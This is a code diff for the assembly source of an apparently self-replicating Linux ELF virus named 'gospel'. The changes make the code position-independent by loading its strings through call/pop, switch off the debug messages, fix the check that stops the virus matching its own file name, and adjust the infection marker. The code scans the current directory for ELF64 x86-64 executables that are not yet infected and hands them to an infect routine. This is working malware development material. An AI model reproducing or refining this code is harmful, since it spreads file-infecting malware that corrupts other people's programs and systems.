@@ -245,57 +245,57 @@ PAGESIZE dd 4096
 ;teststr db 'boo', 13,10,0
 ;teststrlen equ $-teststr
 
-vxname: db 'gospel'
+;vxname: db 'gospel'
 
-targetdir db '.',0
-targetdirlen equ $-targetdir
+;targetdir db '.',0
+;targetdirlen equ $-targetdir
 
 
 ;****************************************************************************************
 ; debug strings
 ;
 ;****************************************************************************************
-
-checkelfpass db 'File is an ELF!', 13, 10, 0
-checkelfpasslen equ $-checkelfpass
-
-checkelffail db 'File is not an ELF!', 13, 10, 0
-checkelffaillen equ $-checkelffail
-
-checkfile_dtreg_fail db 'File is not a DTREG file!', 13, 10, 0
-checkfiledtreg_fail_len equ $-checkfile_dtreg_fail
-
-checkelf_etype_fail db 'e_type is not DYN or EXEC... boo :( ', 13, 10, 0
-checkelf_etype_faillen equ $-checkelf_etype_fail
-
-check64pass db 'File is an ELFCLASS64!', 13, 10, 0
-check64passlen equ $-check64pass
-check64fail db 'File is not an ELFCLASS64 booo :( going to next one', 13, 10, 0
-check64faillen equ $-check64fail
-
-checkarchpass db 'File is compiled for x86-64!', 13, 10, 0
-checkarchpasslen equ $-checkarchpass
-checkarchfail db 'File is not compiled for x86-64 booo :( going to next one', 13, 10, 0
-checkarchfaillen equ $-checkarchfail
-
-pasinfectepass db 'File is not already infected', 13, 10, 0
-pasinfectepasslen equ $-pasinfectepass
-
-filenamepass db 'File is not vx file gospel, good to continue', 13, 10, 0
-filenamepasslen equ $-filenamepass
-
-checkphdrstart db 'Beginning of phdr_loop', 13,10,0
-checkphdrstartlen equ $-checkphdrstart
-
-checkptloadpass db 'Segment is PT_LOAD!', 13, 10, 0
-checkptloadpasslen equ $-checkptloadpass
-checkptloadfail db 'Segment is not PT_LOAD :( going to next one', 13, 10, 0
-checkptloadfaillen equ $-checkptloadfail
-
-textsegmentoffset_pageyes db 'offset to beginning of .text segment in host is > PAGESIZE', 13, 10, 0
-textsegmentoffset_pageyes_len equ $-textsegmentoffset_pageyes
-textsegmentoffset_pageno db 'offset to beginning of .text segment in host is < PAGESIZE', 13, 10, 0
-textsegmentoffset_pageno_len equ $-textsegmentoffset_pageno
+;
+;checkelfpass db 'File is an ELF!', 13, 10, 0
+;checkelfpasslen equ $-checkelfpass
+;
+;checkelffail db 'File is not an ELF!', 13, 10, 0
+;checkelffaillen equ $-checkelffail
+;
+;checkfile_dtreg_fail db 'File is not a DTREG file!', 13, 10, 0
+;checkfiledtreg_fail_len equ $-checkfile_dtreg_fail
+;
+;checkelf_etype_fail db 'e_type is not DYN or EXEC... boo :( ', 13, 10, 0
+;checkelf_etype_faillen equ $-checkelf_etype_fail
+;
+;check64pass db 'File is an ELFCLASS64!', 13, 10, 0
+;check64passlen equ $-check64pass
+;check64fail db 'File is not an ELFCLASS64 booo :( going to next one', 13, 10, 0
+;check64faillen equ $-check64fail
+;
+;checkarchpass db 'File is compiled for x86-64!', 13, 10, 0
+;checkarchpasslen equ $-checkarchpass
+;checkarchfail db 'File is not compiled for x86-64 booo :( going to next one', 13, 10, 0
+;checkarchfaillen equ $-checkarchfail
+;
+;pasinfectepass db 'File is not already infected', 13, 10, 0
+;pasinfectepasslen equ $-pasinfectepass
+;
+;filenamepass db 'File is not vx file gospel, good to continue', 13, 10, 0
+;filenamepasslen equ $-filenamepass
+;
+;checkphdrstart db 'Beginning of phdr_loop', 13,10,0
+;checkphdrstartlen equ $-checkphdrstart
+;
+;checkptloadpass db 'Segment is PT_LOAD!', 13, 10, 0
+;checkptloadpasslen equ $-checkptloadpass
+;checkptloadfail db 'Segment is not PT_LOAD :( going to next one', 13, 10, 0
+;checkptloadfaillen equ $-checkptloadfail
+;
+;textsegmentoffset_pageyes db 'offset to beginning of .text segment in host is > PAGESIZE', 13, 10, 0
+;textsegmentoffset_pageyes_len equ $-textsegmentoffset_pageyes
+;textsegmentoffset_pageno db 'offset to beginning of .text segment in host is < PAGESIZE', 13, 10, 0
+;textsegmentoffset_pageno_len equ $-textsegmentoffset_pageno
 ;****************************************************************************************
 
 ;variables used for phdr and shdr manipulation routines
@@ -368,21 +368,14 @@ ETYPE_EXEC		equ 0x2
 ELFX8664		equ 0x3e
 
 ;D_TYPE values
-DT_REG 			equ 0x8
+;DT_REG 			equ 0x8
 
 ;PHDR vals
 PT_LOAD 	equ 0x1
-;PFLAG_R	equ 0x4
-;PFLAG_X	equ 0x1
-;PFLAG_W	equ 0x2
 PFLAGS_RX	equ 0x5
 PFLAGS_RW	equ 0x6
 
-;MAX_RDENT_BUF	times 0x800 db 0 
 MAX_RDENT_BUF_SIZE equ 0x800
-
-
-;;file pointed to by fstat is fd
 
 
 section .text
@@ -395,6 +388,7 @@ vxstart:
 	mov rbp, rsp
 	sub rsp, 0x1000
 	mov r14, rsp
+	jmp get_cwd
 
 _getdirents:
 ;****************************************************************************************
@@ -405,7 +399,8 @@ _getdirents:
 ;rdx == mode
 ;; returns: fd (in rax, obv)
 ;****************************************************************************************
-	mov rdi, targetdir
+	;mov rdi, targetdir
+	pop rdi
 	xor rsi, rsi 		;no flags
 	add rsi, 0x02000000
 	mov rdx, O_RDONLY	;open read-only
@@ -413,6 +408,12 @@ _getdirents:
 	syscall
 	
 	mov r9, rax						;fd into r9
+	jmp process_dirents
+
+get_cwd:
+	call _getdirents
+	targetdir: db ".", 0
+	
 ;****************************************************************************************
 ; getdents64 - syscall 0x4e
 ;; getdents(unsigned int fd, struct linuxdirent *dirent, unsigned int count);
@@ -424,6 +425,7 @@ _getdirents:
 ;so we can iterate through all dirent entries using the size field in this dirent struc
 ;as an offset for successive jumps in address space	
 ;****************************************************************************************
+process_dirents:
 	mov rdi, rax
 	lea rsi, [r14 + 600 + linuxdirent] ;r14 + 600 is location on the stack where we'll save our dirent struct
 	mov rdx, MAX_RDENT_BUF_SIZE
@@ -522,85 +524,44 @@ check_file:
 			inc r12
 			cmp byte [rsi], 0x0
 			jne .copy_filename
-		;movsb
-		;inc r12
 		
 		;debug print check
 		;lea r13, [rcx + r14 + 600 + linuxdirent.d_nameq]
-		lea r13, [r14 + 200]
-		call _write
+		;lea r13, [r14 + 200]
+		;call _write
 		xor rax, rax
 		push r9
-		;push r12
 	check_filename:
 		cmp qword [r14+200], "."
 		je checknext
-		;jmp get_vx_name
+		jmp get_vx_name
 	check_vx_name:
-		;pop rax
+		pop rsi
 		;lea rsi, [rax]
-		;;lea rsi, [vxname]
-		;lea r13, [rax]
-		;mov r12, 6
-		;call _write
-		;lea r13, [r14 + 200]
-		;mov r12, 6
-		;pop r12
-		;call _write
+		;mov rsi, vxname
 		;mov rsi, [rax]
-		;mov rax, [vxname]
-		mov rsi, vxname
 		lea rdi, [r14 + 200]
-;		xor rcx, rcx
-;		mov rax, 0x006c6570736f67
-		;cmp word [rdi], "go"
-		;lea rdi, [rcx + r14 + 600 + linuxdirent.d_nameq]	;name of file in rdi
-		;mov rcx, 7
 		xor rcx, rcx
 		cld
 		.filenameloop:
-			;mov byte al, [rsi]
-			;mov byte bl, [rdi] 
 			cmpsb
 			jne get_filestat
 			inc cx
 			inc rdi
 			inc rsi
-			cmp rcx, 6
+			cmp rcx, 7
 			jl .filenameloop
-		;rep cmpsb
-		;jne get_filestat
+		jne get_filestat
 		jmp checknext
-		;je checknext
-		;cmp qword [r14+200], rsi
-		;jmp get_filestat
 
-	;get_vx_name:
-	;	call check_vx_name
-	;	vxname: db 'gospel',0		
+	get_vx_name:
+		call check_vx_name
+		vxname: db "gospel"		
 
-		;;lea rdi, [vxname]
-		;;mov rsi, 0x006c6570736f67
-		;;lea rsi, [r14 + 200] 
-		;lea rsi, [rcx + r14 + 600 + linuxdirent.d_nameq]
-		;;cmp qword rsi, rdi
-		;cld
-		;mov rcx, 6
-		;rep cmpsb
-		;cmp dword [rcx + r14 + 600 + linuxdirent.d_nameq], 'gospel'
-		;;je checknext
-		; rsi, rdi
-		;lea r12, [r14 + 100]
-		;mov r12, 0x00006c6570736f67
-		;cmp byte [r14+200], 0x67
+	get_filestat:
 		;lea r13, filenamepass
 		;mov r12, filenamepasslen
 		;call _write
-
-	get_filestat:
-		lea r13, filenamepass
-		mov r12, filenamepasslen
-		call _write
 									;size for mmap == e_shoff + (e_shnum * e_shentsize)
 		lea rsi, [r14 + filestat]	;or retrieve size from filestat struct with an fstat syscall
 		mov rdi, r8
@@ -651,8 +612,6 @@ check_file:
 		test rax, rax
 		js checknext
 	check_elf_header_etype:
-		;lea r13, checkelf_etype_fail
-		;mov r12, checkelf_etype_faillen
 		cmp word [rax + elf_ehdr.e_type], 0x0002
 		je check_elf_header_magic_bytes
 		cmp word [rax + elf_ehdr.e_type], 0x0003
@@ -705,11 +664,11 @@ check_file:
 		je checknext
 	
 	verifie_deja_infecte:
-		cmp dword [rax + elf_ehdr.ei_padding], 0x6f786f78
+		cmp dword [rax + elf_ehdr.ei_padding], 0x786f786f
 		je checknext
-		lea r13, pasinfectepass
-		mov r12, pasinfectepasslen
-		call _write
+		;lea r13, pasinfectepass
+		;mov r12, pasinfectepasslen
+		;call _write
 
 	ready2infect:
 		call infect	
